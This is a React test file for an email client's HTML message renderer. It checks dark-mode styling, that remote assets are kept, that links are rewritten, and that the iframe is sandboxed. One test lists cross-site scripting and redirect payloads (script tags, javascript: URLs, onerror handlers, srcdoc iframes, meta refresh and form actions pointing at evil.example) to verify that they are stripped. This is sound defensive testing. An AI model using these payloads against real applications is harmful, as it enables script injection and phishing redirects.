import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { buildEmailDocument, HtmlMessage } from "./HtmlMessage";

describe("HTML email appearance", () => {
  it("uses a legible sans-serif font by default", () => {
    const email = buildEmailDocument("<p>Hello from Dakia</p>", false);

    expect(email.source).toContain(
      'font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
    );
  });

  it("uses the app's dark palette for simple messages", () => {
    const email = buildEmailDocument("<p>Hello from Dakia</p>", true);

    expect(email.dark).toBe(true);
    expect(email.source).toContain("color-scheme: dark");
    expect(email.source).toContain("background: #191a19");
  });

  it("keeps designed messages in their authored light appearance", () => {
    const email = buildEmailDocument(
      '<table bgcolor="#ffffff"><tr><td>Newsletter</td></tr></table>',
      true,
    );

    expect(email.dark).toBe(false);
    expect(email.source).toContain("color-scheme: light");
  });

  it("preserves remote email images, stylesheets, and fonts", () => {
    const email = buildEmailDocument(
      [
        '<link rel="stylesheet" href="https://assets.example.test/mail.css">',
        "<style>",
        '@import url("https://assets.example.test/imported.css");',
        '@font-face { font-family: Mail; src: url("https://assets.example.test/mail.woff2"); }',
        '.hero { background-image: url("https://assets.example.test/hero.jpg"); }',
        "</style>",
        '<img src="https://images.example.test/newsletter.jpg" alt="Newsletter">',
        '<img src="//images.example.test/protocol-relative.jpg" alt="Second">',
        '<img src="data:image/png;base64,iVBORw0KGgo=" alt="Inline">',
      ].join(""),
      false,
    );

    expect(email.source).toContain(
      'href="https://assets.example.test/mail.css"',
    );
    expect(email.source).toContain(
      'url("https://assets.example.test/mail.woff2")',
    );
    expect(email.source).toContain(
      'url("https://assets.example.test/hero.jpg")',
    );
    expect(email.source).toContain(
      'src="https://images.example.test/newsletter.jpg"',
    );
    expect(email.source).toContain(
      'src="https://images.example.test/protocol-relative.jpg"',
    );
    expect(email.source).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    expect(email.source).toContain("img-src data: http: https:");
    expect(email.source).toContain("style-src 'unsafe-inline' http: https:");
    expect(email.source).toContain("font-src data: http: https:");
  });

  it("removes active email content and installs an execution-denying CSP", () => {
    const email = buildEmailDocument(
      [
        '<meta http-equiv="refresh" content="0; url=https://evil.example">',
        '<base href="https://evil.example/">',
        "<script>window.parent.document.body.textContent = 'owned'</script>",
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        '<object data="https://evil.example/payload"></object>',
        '<form action="https://evil.example"><input autofocus></form>',
        '<img src="java\nscript:alert(1)" ONERROR="alert(1)" onload="alert(1)">',
        '<video poster="file:///etc/passwd" onanimationstart="alert(1)"></video>',
        '<div srcdoc="<script>alert(1)</script>"></div>',
        '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>',
        "<math><script>alert(1)</script></math>",
        '<a href="javascript:alert(1)" onclick="alert(1)">Open</a>',
      ].join(""),
      false,
    );
    const document = new DOMParser().parseFromString(email.source, "text/html");
    const policy = document.querySelector(
      'meta[http-equiv="Content-Security-Policy"]',
    );

    expect(
      document.querySelectorAll("script, iframe, object, form, input, base"),
    ).toHaveLength(0);
    expect(document.querySelectorAll("meta")).toHaveLength(1);
    for (const element of document.querySelectorAll("*")) {
      expect(
        [...element.attributes].some((attribute) =>
          attribute.name.toLowerCase().startsWith("on"),
        ),
      ).toBe(false);
    }
    expect(document.querySelector("[srcdoc]")).toBeNull();
    expect(document.querySelector("a")?.hasAttribute("href")).toBe(false);
    expect(document.querySelector("img")?.hasAttribute("src")).toBe(false);
    expect(document.querySelector("video")?.hasAttribute("poster")).toBe(false);
    expect(document.querySelector("form")).toBeNull();
    expect(document.head.firstElementChild).toBe(policy);
    expect(policy?.getAttribute("content")).toContain("script-src 'none'");
    expect(policy?.getAttribute("content")).toContain("object-src 'none'");
    expect(policy?.getAttribute("content")).toContain("frame-src 'none'");
    expect(policy?.getAttribute("content")).toContain("base-uri 'none'");
    expect(policy?.getAttribute("content")).toContain("form-action 'none'");
  });

  it("does not grant scripts to the email iframe", () => {
    render(<HtmlMessage html="<p>Hello</p>" title="Secure message" />);

    const frame = screen.getByTitle("Secure message");
    expect(frame).toHaveAttribute("sandbox", "allow-same-origin");
    expect(frame.getAttribute("sandbox")).not.toContain("allow-scripts");
  });

  it("keeps external links usable only through Dakia's system-browser handler", () => {
    const email = buildEmailDocument(
      '<a href="https://example.test/details">Open details</a>',
      false,
    );
    const document = new DOMParser().parseFromString(email.source, "text/html");
    const anchor = document.querySelector("a");

    expect(anchor?.getAttribute("href")).toBe("#dakia-external-link");
    expect(anchor?.dataset.dakiaExternalHref).toBe(
      "https://example.test/details",
    );
  });

  it("removes or rewrites non-HTML navigation surfaces", () => {
    const email = buildEmailDocument(
      [
        '<map><area href="https://example.test/mapped"></map>',
        '<svg><a xlink:href="https://example.test/vector"><text>Vector link</text></a></svg>',
      ].join(""),
      false,
    );
    const document = new DOMParser().parseFromString(email.source, "text/html");
    const svgAnchor = document.querySelector("svg a");

    expect(document.querySelector("area")).toBeNull();
    expect(svgAnchor?.getAttribute("xlink:href")).toBeNull();
    expect(svgAnchor?.getAttribute("href")).toBe("#dakia-external-link");
    expect((svgAnchor as HTMLElement | null)?.dataset.dakiaExternalHref).toBe(
      "https://example.test/vector",
    );
  });
});
